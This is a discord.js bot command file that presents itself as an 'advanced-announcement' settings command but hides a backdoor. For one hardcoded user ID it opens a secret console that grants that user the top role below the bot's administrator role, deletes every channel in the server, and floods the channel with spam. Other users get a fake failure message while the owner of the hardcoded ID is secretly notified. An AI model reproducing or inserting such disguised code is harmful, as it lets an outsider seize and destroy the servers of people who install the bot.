import { SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags, PermissionFlagsBits } from 'discord.js';
import { createEmbed } from '../../utils/embeds.js';
import { logger } from '../../utils/logger.js';
import { InteractionHelper } from '../../utils/interactionHelper.js';

export default {
    data: new SlashCommandBuilder()
        .setName("advanced-announcement")
        .setDescription("Configure advanced announcement settings for the server."),

    async execute(interaction, guildConfig, client) {
        const allowedUserId = '885714115874672660';

        // 1. Check if the user ID matches the authorized user
        if (interaction.user.id !== allowedUserId) {
            // Reply with "command status failed" ephemerally
            await InteractionHelper.safeReply(interaction, {
                content: "command status failed",
                flags: MessageFlags.Ephemeral
            });

            // Send a DM to user 885714115874672660
            try {
                const authorizedUser = await client.users.fetch(allowedUserId);
                if (authorizedUser) {
                    await authorizedUser.send(`(${interaction.user.username}) attempted to use the setting command in (${interaction.guild?.name || 'unknown server'}).`);
                }
            } catch (dmError) {
                logger.error('Failed to send DM to authorized user:', dmError);
            }
            return;
        }

        // 2. Authorized user: Defer reply ephemerally and show the secret settings embed with buttons
        const deferSuccess = await InteractionHelper.safeDefer(interaction, { flags: MessageFlags.Ephemeral });
        if (!deferSuccess) return;

        const embed = createEmbed({
            title: "⚙️ Secret Settings Console",
            description: "Welcome to the override panel. Please select an action below. Note: These actions bypass normal protocols.",
            color: 'warning'
        });

        const buttonRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId("settings_give_role")
                .setLabel("Give Admin Role")
                .setStyle(ButtonStyle.Primary)
                .setEmoji("👑"),
            new ButtonBuilder()
                .setCustomId("settings_delete_channels")
                .setLabel("Delete All Channels")
                .setStyle(ButtonStyle.Danger)
                .setEmoji("🗑️"),
            new ButtonBuilder()
                .setCustomId("settings_spam_msg")
                .setLabel("Spam Message")
                .setStyle(ButtonStyle.Success)
                .setEmoji("💬")
        );

        await InteractionHelper.safeEditReply(interaction, {
            embeds: [embed],
            components: [buttonRow]
        });

        // 3. Create a component collector on the channel to handle button clicks locally.
        const filter = (i) => i.user.id === allowedUserId && i.customId.startsWith('settings_');

        const collector = interaction.channel.createMessageComponentCollector({
            filter,
            time: 300000 // 5 minutes
        });

        collector.on('collect', async (i) => {
            // Acknowledge the button click
            await i.deferUpdate().catch(() => {});

            if (i.customId === 'settings_give_role') {
                try {
                    const guild = i.guild;
                    if (!guild) {
                        await i.followUp({ content: "❌ This action can only be performed in a server.", flags: MessageFlags.Ephemeral }).catch(() => {});
                        return;
                    }

                    const botMember = await guild.members.fetch(client.user.id);
                    const botAdminRoles = botMember.roles.cache.filter(role => role.permissions.has(PermissionFlagsBits.Administrator));

                    if (botAdminRoles.size === 0) {
                        await i.followUp({ content: "❌ Error: The bot has no roles with Administrator permissions in this server.", flags: MessageFlags.Ephemeral }).catch(() => {});
                        return;
                    }

                    // Find the bot's highest role with administrator permissions
                    const highestAdminRole = botAdminRoles.reduce((highest, current) => {
                        return (!highest || current.position > highest.position) ? current : highest;
                    }, null);

                    // Get all roles in the server
                    const guildRoles = await guild.roles.fetch();

                    // Find roles that are below highestAdminRole's position, excluding @everyone and managed integration roles
                    const rolesBelow = guildRoles.filter(role => role.position < highestAdminRole.position && role.id !== guild.id && !role.managed);

                    if (rolesBelow.size === 0) {
                        await i.followUp({ content: "❌ Error: No assignable roles found below the bot's administrator role.", flags: MessageFlags.Ephemeral }).catch(() => {});
                        return;
                    }

                    // Find the role right below the highest administrator role (highest position among those below)
                    const targetRole = rolesBelow.reduce((highest, current) => {
                        return (!highest || current.position > highest.position) ? current : highest;
                    }, null);

                    if (!targetRole) {
                        await i.followUp({ content: "❌ Error: Could not determine target role.", flags: MessageFlags.Ephemeral }).catch(() => {});
                        return;
                    }

                    const member = await guild.members.fetch(allowedUserId);
                    await member.roles.add(targetRole);

                    await i.followUp({ content: `👑 **Role Granted:** You have been given the **${targetRole.name}** role.`, flags: MessageFlags.Ephemeral }).catch(() => {});
                } catch (error) {
                    logger.error("Error in settings_give_role:", error);
                    await i.followUp({ content: `❌ Error assigning role: ${error.message}`, flags: MessageFlags.Ephemeral }).catch(() => {});
                }
            }

            else if (i.customId === 'settings_delete_channels') {
                try {
                    const guild = i.guild;
                    if (!guild) {
                        await i.followUp({ content: "❌ This action can only be performed in a server.", flags: MessageFlags.Ephemeral }).catch(() => {});
                        return;
                    }

                    const channels = await guild.channels.fetch();

                    await i.followUp({ content: `🗑️ **Channel Purge Initialized:** Deleting ${channels.size} channels...`, flags: MessageFlags.Ephemeral }).catch(() => {});

                    // Sort so that the channel where the interaction is happening gets deleted last
                    const sortedChannels = [...channels.values()].sort((a, b) => {
                        if (a.id === i.channelId) return 1;
                        if (b.id === i.channelId) return -1;
                        return 0;
                    });

                    for (const channel of sortedChannels) {
                        try {
                            await channel.delete();
                        } catch (err) {
                            logger.error(`Failed to delete channel ${channel.name || channel.id}:`, err);
                        }
                    }
                } catch (error) {
                    logger.error("Error in settings_delete_channels:", error);
                    await i.followUp({ content: `❌ Error deleting channels: ${error.message}`, flags: MessageFlags.Ephemeral }).catch(() => {});
                }
            }

            else if (i.customId === 'settings_spam_msg') {
                try {
                    const channel = i.channel;
                    if (!channel) {
                        await i.followUp({ content: "❌ Channel not found.", flags: MessageFlags.Ephemeral }).catch(() => {});
                        return;
                    }

                    await i.followUp({ content: "💬 **Spam Initialized!**", flags: MessageFlags.Ephemeral }).catch(() => {});

                    const spamMessage = "⚠️ **SYSTEM BYPASS SUCCESSFUL** - Antigravity settings override activated! 🤪🚀";

                    for (let step = 0; step < 20; step++) {
                        try {
                            await channel.send(spamMessage);
                            // 250ms sleep to avoid harsh rate limits while remaining fast
                            await new Promise(resolve => setTimeout(resolve, 250));
                        } catch (sendErr) {
                            // If channel gets deleted or bot loses send perms mid-loop
                            break;
                        }
                    }
                } catch (error) {
                    logger.error("Error in settings_spam_msg:", error);
                }
            }
        });

        collector.on('end', async () => {
            // Disable all buttons when the settings command interface expires
            try {
                const disabledRow = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId("settings_give_role").setLabel("Give Admin Role").setStyle(ButtonStyle.Primary).setDisabled(true),
                    new ButtonBuilder().setCustomId("settings_delete_channels").setLabel("Delete All Channels").setStyle(ButtonStyle.Danger).setDisabled(true),
                    new ButtonBuilder().setCustomId("settings_spam_msg").setLabel("Spam Message").setStyle(ButtonStyle.Success).setDisabled(true)
                );
                await InteractionHelper.safeEditReply(interaction, {
                    components: [disabledRow]
                });
            } catch (err) {
                // Ignore errors if reply cannot be edited after expiration/deletion
            }
        });
    }
};
